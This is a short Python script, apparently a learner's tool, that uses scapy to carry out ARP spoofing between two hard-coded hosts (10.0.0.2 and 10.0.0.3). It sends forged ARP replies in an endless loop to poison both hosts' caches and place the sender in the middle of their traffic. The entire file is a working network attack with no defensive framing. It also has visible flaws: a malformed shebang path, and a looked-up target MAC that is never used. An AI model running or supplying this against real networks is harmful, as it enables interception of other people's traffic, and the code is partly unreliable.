#!/usr/env/bin python3

import scapy.all as scapy
import time

def getMAC(ip):
	arpRequest = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arpRequestBroadcast = broadcast/arpRequest
	answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

	return answeredList[0][1].hwsrc


def spoof(targetIP, spoofIP):
	targetMAC = getMAC(targetIP)
	packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = "", psrc = spoofIP)
	scapy.send(packet, verbose = False)


sentPacketsCount = 0
try:
	while True:
		spoof("10.0.0.2", "10.0.0.3")
		spoof("10.0.0.3", "10.0.0.2")
		sentPacketsCount += 2
		print("\r[+] Packets sent: " + str(sentPacketsCount), end = "")
		time.sleep(2)
except KeyboardInterrupt:
	print("[+] Detected CTRL + C . . . . Quitting.")